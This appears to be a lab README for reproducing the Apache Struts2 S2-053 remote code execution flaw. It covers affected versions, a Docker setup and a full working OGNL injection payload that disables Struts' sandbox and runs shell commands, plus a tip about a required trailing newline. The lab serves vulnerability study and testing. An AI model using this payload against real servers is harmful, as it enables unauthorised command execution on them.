# S2-053 Remote Code Execution Vulnerability

Impact version: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10

Vulnerability details:

 - http://struts.apache.org/docs/s2-053.html
 - https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e

## Test environment construction

```
Docker-compose up -d
```

After the environment is running, you can see a submission page by visiting `http://your-ip:8080/hello.action`.

## Vulnerability recurrence

Struts2 allows simultaneous parsing of OGNL expressions when using the Freemarker template engine. The data that causes the user input is not resolved by OGNL itself, but after being parsed once by Freemarker, it becomes an expression and is parsed by OGNL a second time, causing arbitrary command execution vulnerabilities.

Enter the following Payload to successfully execute the command:

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(# ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(# context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win' ))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p =new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(# process.getInputStream()))}

```

![](01.png)

Explanation: Some students said that they could not reproduce the loopholes. After my test, I found that the **newline ** at the end of the above Payload could not be dropped (that is, the payload must be followed by a newline, although I don't know why), then send It will be successful.